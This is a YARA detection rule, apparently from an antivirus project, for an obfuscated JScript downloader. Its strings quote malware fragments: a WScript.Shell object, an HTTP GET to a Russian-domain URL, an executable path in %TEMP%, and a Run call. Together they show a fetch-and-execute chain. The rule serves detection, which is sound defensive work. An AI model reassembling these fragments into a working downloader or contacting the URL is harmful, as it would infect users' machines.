rule sig_20160401_8ae34ab229add10b79dbd7694d19e990 {
  meta:
    description = "datamaliciousorder - file 20160401_8ae34ab229add10b79dbd7694d19e990.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d8a416cde0a4dc5a0b10c82157b9eb2910c43ac5b1c49c5d770edef3b9fb30fa"

  strings:
    $s1  = "function GtGa(MiEgz, HwMf){SmRb = SmRb * 1; return MiEgz - HwMf;};" fullword ascii
    $s2  = "var LwMbg = function NfqNnb() {return WScript[AiBsc](\"WScript\"+\".Shell\");}(), EzvVz = 11;" fullword ascii
    $s3  = "if (ThDw[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s4  = "ThDw[XdId](\"G\" + \"ET\", \"http://teamlight-pro.ru/j7esp\", false);" fullword ascii
    $s5  = "function LzbXdw(){return YveAq + \"\";};" fullword ascii
    $s6  = "function ShzGr() {return LwMbg[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vPecUVeCF.ex\" + \"e\";};" fullword ascii
    $s7  = "function WgnLh() {return ((MgIx == true) && (MgIx == LkfNy)) ? 1 : SmRb;};" fullword ascii
    $s8  = "function ZlFmr(){return AiBsc;};" fullword ascii
    $s9  = "return GtGa(QaOaw, WjQq);" fullword ascii
    $s10 = "function WevJq()" fullword ascii
    $s11 = "LkfNy = true; " fullword ascii
    $s12 = "MgIx = true; " fullword ascii
    $s13 = "var GwhVzm = false;" fullword ascii
    $s14 = "}while (NdeTyd);" fullword ascii
    $s15 = "function YhoQq(ItOo){LwMbg[\"R\"+\"un\"](ItOo, SmRb, SmRb);};" fullword ascii
    $s16 = "var RpzFfp = new this[\"Date\"]();" fullword ascii
    $s17 = "function AbBw(){return 23;};" fullword ascii
    $s18 = "var MgIx = false;" fullword ascii
    $s19 = "var LkfNy = false;" fullword ascii
    $s20 = "function OntVn(JiNg) {var CgpUvf = (1, 2, 3, 4, 5, JiNg); return CgpUvf;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}